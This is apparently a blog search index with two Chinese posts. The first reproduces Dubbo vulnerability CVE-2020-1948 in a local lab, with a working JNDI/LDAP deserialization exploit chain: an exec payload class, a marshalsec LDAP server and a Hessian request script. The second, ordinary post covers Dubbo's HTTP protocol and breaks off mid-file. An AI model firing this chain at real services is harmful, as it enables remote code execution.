<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>[CVE]重现dubbo安全漏洞cve-2020-1948</title>
    <link href="/2020/07/04/cve-2020-1948/"/>
    <url>/2020/07/04/cve-2020-1948/</url>
    
    <content type="html"><![CDATA[<h2 id="CVE-重现dubbo安全漏洞cve-2020-1948"><a href="#CVE-重现dubbo安全漏洞cve-2020-1948" class="headerlink" title="[CVE]重现dubbo安全漏洞cve-2020-1948"></a>[CVE]重现dubbo安全漏洞cve-2020-1948</h2><h3 id="准备provider服务"><a href="#准备provider服务" class="headerlink" title="准备provider服务"></a>准备provider服务</h3><p>直接用官方的demo，clone之后做少许改动，主要改动点是添加一个jar包依赖</p><pre><code class="hljs shell">git clone https://github.com/apache/dubbo-spring-boot-projectcd dubbo-spring-boot-projectgit checkout 2.7.1 -b b2.7.1</code></pre><p>然后将项目导入到你喜欢的ide中。  </p><p>在provider-sample项目的pom.xml(dubbo-spring-boot-project/dubbo-spring-boot-samples/auto-configure-samples/provider-sample/pom.xml)中增加依赖：  </p><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>  <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>com.rometools<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>  <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>rome<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>  <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>1.7.0<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span></code></pre><p>修改默认端口：dubbo-spring-boot-samples/auto-configure-samples/provider-sample/src/main/resources/application.properties为12347  </p><p>运行DubboAutoConfigurationProviderBootstrap   把provider启动起来。  </p><h3 id="准备ExploitMac"><a href="#准备ExploitMac" class="headerlink" title="准备ExploitMac"></a>准备ExploitMac</h3><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ExploitMac</span></span>&#123;<span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-title">ExploitMac</span><span class="hljs-params">()</span></span>&#123;<span class="hljs-keyword">try</span>&#123;java.lang.Runtime.getRuntime().exec(<span class="hljs-string">"/System/Applications/Calculator.app/Contents/MacOS/Calculator"</span>);&#125;<span class="hljs-keyword">catch</span>(java.io.IOException e)&#123;e.printStackTrace();&#125;&#125;&#125;</code></pre><p>编译ExploitMac.java</p><pre><code class="hljs shell">javac ExploitMac.java</code></pre><h3 id="准备一个http服务"><a href="#准备一个http服务" class="headerlink" title="准备一个http服务"></a>准备一个http服务</h3><p>安装python3,mac可以用homebrew安装，或者官网下载包回来装</p><p>在上面ExploitMac.class所在目录下启动一个http服务</p><pre><code class="hljs shell">python3 -m http.server 8088</code></pre><h3 id="准备marshalsec"><a href="#准备marshalsec" class="headerlink" title="准备marshalsec"></a>准备marshalsec</h3><p>去git上clone出来，自己package  </p><pre><code class="hljs shell">git clone https://github.com/mbechler/marshalsec.gitcd marshalsecmvn package -DskipTests</code></pre><p>启动marshalsec</p><pre><code class="hljs shell">cd targetjava -cp ./target/marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer http://127.0.0.1:8088/\#ExploitMac 8087</code></pre><h3 id="准备dubbo-consumer-demo-py"><a href="#准备dubbo-consumer-demo-py" class="headerlink" title="准备dubbo-consumer-demo.py"></a>准备dubbo-consumer-demo.py</h3><pre><code class="hljs python"><span class="hljs-keyword">from</span> dubbo.codec.hessian2 <span class="hljs-keyword">import</span> Decoder,new_object<span class="hljs-keyword">from</span> dubbo.client <span class="hljs-keyword">import</span> DubboClientclient = DubboClient(<span class="hljs-string">'127.0.0.1'</span>, <span class="hljs-number">12347</span>)JdbcRowSetImpl=new_object(      <span class="hljs-string">'com.sun.rowset.JdbcRowSetImpl'</span>,      dataSource=<span class="hljs-string">"ldap://127.0.0.1:8087/ExploitMac"</span>,      strMatchColumns=[<span class="hljs-string">"foo"</span>]      )JdbcRowSetImplClass=new_object(      <span class="hljs-string">'java.lang.Class'</span>,      name=<span class="hljs-string">"com.sun.rowset.JdbcRowSetImpl"</span>,      )toStringBean=new_object(      <span class="hljs-string">'com.rometools.rome.feed.impl.ToStringBean'</span>,      beanClass=JdbcRowSetImplClass,      obj=JdbcRowSetImpl      )resp = client.send_request_and_return_response(    service_name=<span class="hljs-string">'com.code260.ss.dubbo.demov.facade.service.UserService'</span>,    method_name=<span class="hljs-string">'sayHello'</span>,    args=[toStringBean])</code></pre><p>安装dubbo-py</p><pre><code class="hljs shell">python3 -m pip install dubbo-py</code></pre><p>执行上面工具脚本</p><pre><code class="hljs shell">python3 dubbo-consumer-demo.py</code></pre><p>复现了，能成功看到计算器弹出来…</p>]]></content>
    
    
    <categories>
      
      <category>opensource-code-study</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CVE</tag>
      
      <tag>dubbo，security</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[dubbo]28.扩展支持HTTP协议</title>
    <link href="/2020/06/25/dubbo-28.support-http/"/>
    <url>/2020/06/25/dubbo-28.support-http/</url>
    
    <content type="html"><![CDATA[<h2 id="28-扩展支持HTTP协议"><a href="#28-扩展支持HTTP协议" class="headerlink" title="28.扩展支持HTTP协议"></a>28.扩展支持HTTP协议</h2><p>关于dubbo对http协议的支持，要分几个维度说：</p><ol><li>仅仅传输协议使用http，报文的组织方式没有要求，那么dubbo这个版本(2.5.3)原生提供的http协议就能满足。适当配置即可。此处报文指http请求体与响应体的报文。http协议本身规定了其报文规范，诸如method、url、content-type，header等等，但是其请求体与响应体中内容你可以随意放置。</li><li>传输协议使用http，报文组织希望使用json/xml，那么可以使用当当的dubbox，dubbo在2.6.0之后合入了。<a href="https://dangdangdotcom.github.io/dubbox/rest.html" target="_blank" rel="noopener">使用入门文档</a>。这种形式还分三种：<ol><li>非dubbo的消费端调用dubbo的REST服务（non-dubbo –&gt; dubbo）</li><li>dubbo消费端调用dubbo的REST服务 （dubbo –&gt; dubbo）</li><li>dubbo的消费端调用非dubbo的REST服务 （dubbo –&gt; non-dubbo） </li></ol></li><li>其他的一些玩法：<a href="https://github.com/dangdangdotcom/dubbox/pull/107" target="_blank" rel="noopener">基于spring mvc的玩法</a>   <a href="https://github.com/xydonne/dubbo-extension/tree/master/dubbo-rpc-restexpress" target="_blank" rel="noopener">基于RestExpress的玩法</a>   <a href="https://github.com/dubboclub/dubbo-plus/tree/master/restful" target="_blank" rel="noopener">基于Servlet的玩法</a></li></ol><h3 id="dubbo原生支持的http协议"><a href="#dubbo原生支持的http协议" class="headerlink" title="dubbo原生支持的http协议"></a>dubbo原生支持的http协议</h3><h4 id="case配置"><a href="#case配置" class="headerlink" title="case配置"></a>case配置</h4><p>在META-INF目录下放置名为com.alibaba.dubbo.rpc.Protocol的文件，里面写上</p><pre><code class="hljs properties"><span class="hljs-attr">http</span>=<span class="hljs-string">com.alibaba.dubbo.rpc.protocol.http.HttpProtocol</span></code></pre><p>配置文件中声明协议使用http</p><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dubbo:protocol</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"http"</span> <span class="hljs-attr">port</span>=<span class="hljs-string">"10880"</span>/&gt;</span></code></pre><p>pom中增加spring-web 3.x和jetty等依赖，如果用spring-web4.x的话会有个别类不能发现。  </p><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.springframework<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>spring-web<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>3.2.18.RELEASE<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>javax.servlet<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>javax.servlet-api<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>3.0.1<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">scope</span>&gt;</span>provided<span class="hljs-tag">&lt;/<span class="hljs-name">scope</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.mortbay.jetty<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>jetty<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>6.1.26<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span></code></pre><h4 id="简单分析其实现"><a href="#简单分析其实现" class="headerlink" title="简单分析其实现"></a>简单分析其实现</h4><p>默认的http协议支持，仅仅是传输走http协议的方式，报文的组织方式是用的spring-web中的java序列化的方式。  </p><p>实现主要依赖<code>spring-web</code> 3.x版本加<code>jetty</code>实现。</p><p>用wireshark抓到的请求报文如下：  </p><pre><code class="hljs plain">POST &#x2F;com.code260.ss.dubbo.demov.facade.service.HelloService HTTP&#x2F;1.1Content-Type: application&#x2F;x-java-serialized-objectAccept-Encoding: gzipUser-Agent: Java&#x2F;1.8.0_121Host: 172.17.0.224:10880Accept: text&#x2F;html, image&#x2F;gif, image&#x2F;jpeg, *; q&#x3D;.2, *&#x2F;*; q&#x3D;.2Connection: keep-aliveContent-Length: 343....sr.5org.springframework.remoting.support.RemoteInvocation_l.......[.argumentst..[Ljava&#x2F;lang&#x2F;Object;L.attributest..Ljava&#x2F;util&#x2F;Map;L.methodNamet..Ljava&#x2F;lang&#x2F;String;[..parameterTypest..[Ljava&#x2F;lang&#x2F;Class;xpur..[Ljava.lang.Object;..X..s)l...xp....t..Simonpt..sayHellour..[Ljava.lang.Class;......Z....xp....vr..java.lang.String...8z;.B...xpHTTP&#x2F;1.1 200 OKContent-Type: application&#x2F;x-java-serialized-objectTransfer-Encoding: chunkedServer: Jetty(6.1.26)....sr.;org.springframework.remoting.support.RemoteInvocationResult.....IJm...L.exceptiont..Ljava&#x2F;lang&#x2F;Throwable;L..valuet..Ljava&#x2F;lang&#x2F;Object;xppp</code></pre><p>provider端解码请求的堆栈：  </p><pre><code class="hljs java">HttpInvokerServiceExporter(RemoteInvocationSerializingExporter).doReadRemoteInvocation(ObjectInputStream) line: <span class="hljs-number">142</span>HttpInvokerServiceExporter.readRemoteInvocation(HttpServletRequest, InputStream) line: <span class="hljs-number">121</span>HttpInvokerServiceExporter.readRemoteInvocation(HttpServletRequest) line: <span class="hljs-number">100</span>HttpInvokerServiceExporter.handleRequest(HttpServletRequest, HttpServletResponse) line: <span class="hljs-number">77</span>HttpProtocol$InternalHandler.handle(HttpServletRequest, HttpServletResponse) line: <span class="hljs-number">81</span>DispatcherServlet.service(HttpServletRequest, HttpServletResponse) line: <span class="hljs-number">64</span>DispatcherServlet(HttpServlet).service(ServletRequest, ServletResponse) line: <span class="hljs-number">770</span>ServletHolder.handle(ServletRequest, ServletResponse) line: <span class="hljs-number">511</span>ServletHandler.handle(String, HttpServletRequest, HttpServletResponse, <span class="hljs-keyword">int</span>) line: <span class="hljs-number">401</span>Server(HandlerWrapper).handle(String, HttpServletRequest, HttpServletResponse, <span class="hljs-keyword">int</span>) line: <span class="hljs-number">152</span>Server.handle(HttpConnection) line: <span class="hljs-number">322</span>HttpConnection.handleRequest() line: <span class="hljs-number">542</span>HttpConnection$RequestHandler.content(Buffer) line: <span class="hljs-number">945</span>HttpParser.parseNext() line: <span class="hljs-number">756</span>HttpParser.parseAvailable() line: <span class="hljs-number">218</span>HttpConnection.handle() line: <span class="hljs-number">404</span>SelectChannelConnector$ConnectorEndPoint(SelectChannelEndPoint).run() line: <span class="hljs-number">410</span>QueuedThreadPool$PoolThread.run() line: <span class="hljs-number">582</span></code></pre><p>解码的代码由spring-web完成，代码如下：  </p><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">protected</span> RemoteInvocation <span class="hljs-title">doReadRemoteInvocation</span><span class="hljs-params">(ObjectInputStream ois)</span></span><span class="hljs-function"><span class="hljs-keyword">throws</span> IOException, ClassNotFoundException </span>&#123;<span class="hljs-number">141</span>Object obj = ois.readObject();<span class="hljs-number">142</span><span class="hljs-keyword">if</span> (!(obj <span class="hljs-keyword">instanceof</span> RemoteInvocation)) &#123;<span class="hljs-number">143</span><span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> RemoteException(<span class="hljs-string">"Deserialized object needs to be assignable to type ["</span> +RemoteInvocation.class.getName() + "]: " + obj);&#125;<span class="hljs-keyword">return</span> (RemoteInvocation) obj;&#125;</code></pre><p>141行从流中读出来的这个obj(反序列化出来)就是RemoteInvocation。这个RemoteInvocation中有方法名、参数类型、参数值等，调试其看到其信息如下：  </p><pre><code class="hljs java">[Simon]sayHello<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">java</span>.<span class="hljs-title">lang</span>.<span class="hljs-title">String</span></span></code></pre><p>141行的ois是org.springframework.remoting.rmi.CodebaseAwareObjectInputStream。</p><h3 id="dubbo合入dubbox之后http-rest的支持"><a href="#dubbo合入dubbox之后http-rest的支持" class="headerlink" title="dubbo合入dubbox之后http rest的支持"></a>dubbo合入dubbox之后http rest的支持</h3><h4 id="case配置-1"><a href="#case配置-1" class="headerlink" title="case配置"></a>case配置</h4><p>dubbo2.5.3在此处用不了了，我们换成2.6.8。</p><p>pom依赖  </p><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">project</span> <span class="hljs-attr">xmlns</span>=<span class="hljs-string">"http://maven.apache.org/POM/4.0.0"</span></span><span class="hljs-tag"><span class="hljs-attr">xmlns:xsi</span>=<span class="hljs-string">"http://www.w3.org/2001/XMLSchema-instance"</span></span><span class="hljs-tag"><span class="hljs-attr">xsi:schemaLocation</span>=<span class="hljs-string">"http://maven.apache.org/POM/4.0.0 https://maven.apache.org/xsd/maven-4.0.0.xsd"</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">modelVersion</span>&gt;</span>4.0.0<span class="hljs-tag">&lt;/<span class="hljs-name">modelVersion</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>com.code260.ss<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>dubbox-demo<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>0.0.1-SNAPSHOT<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">packaging</span>&gt;</span>pom<span class="hljs-tag">&lt;/<span class="hljs-name">packaging</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">dependencies</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.apache.curator<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>curator-client<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>2.12.0<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.apache.curator<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>curator-framework<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>2.12.0<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>com.alibaba<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>dubbo<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>2.6.8<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.springframework<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>spring-test<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>3.2.18.RELEASE<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">scope</span>&gt;</span>test<span class="hljs-tag">&lt;/<span class="hljs-name">scope</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>junit<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>junit<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>4.12<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">scope</span>&gt;</span>test<span class="hljs-tag">&lt;/<span class="hljs-name">scope</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.springframework<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>spring-context<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>3.2.18.RELEASE<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.springframework<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>spring-web<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>3.2.18.RELEASE<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>com.101tec<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>zkclient<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>0.10<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>javax.servlet<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>javax.servlet-api<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>3.0.1<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">scope</span>&gt;</span>provided<span class="hljs-tag">&lt;/<span class="hljs-name">scope</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.mortbay.jetty<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>jetty<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>6.1.26<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.jboss.resteasy<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>resteasy-jaxrs<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>3.0.7.Final<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.jboss.resteasy<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>resteasy-client<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>3.0.7.Final<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>javax.validation<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>validation-api<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>1.0.0.GA<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><span class="hljs-comment">&lt;!-- 如果要使用json序列化 --&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.jboss.resteasy<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>resteasy-jackson-provider<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>3.0.7.Final<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><span class="hljs-comment">&lt;!-- 如果要使用xml序列化 --&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.jboss.resteasy<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>resteasy-jaxb-provider<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>3.0.7.Final<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><span class="hljs-comment">&lt;!-- 如果要使用netty server --&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.jboss.resteasy<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>resteasy-netty<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>3.0.7.Final<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><span class="hljs-comment">&lt;!-- 如果要使用Sun HTTP server --&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.jboss.resteasy<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>resteasy-jdk-http<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>3.0.7.Final<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><span class="hljs-comment">&lt;!-- 如果要使用tomcat server --&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.apache.tomcat.embed<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>tomcat-embed-core<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>8.0.11<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.apache.tomcat.embed<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>tomcat-embed-logging-juli<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>8.0.11<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.apache.httpcomponents<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>httpclient<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>4.5.3<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">dependencies</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">build</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">pluginManagement</span>&gt;</span><span 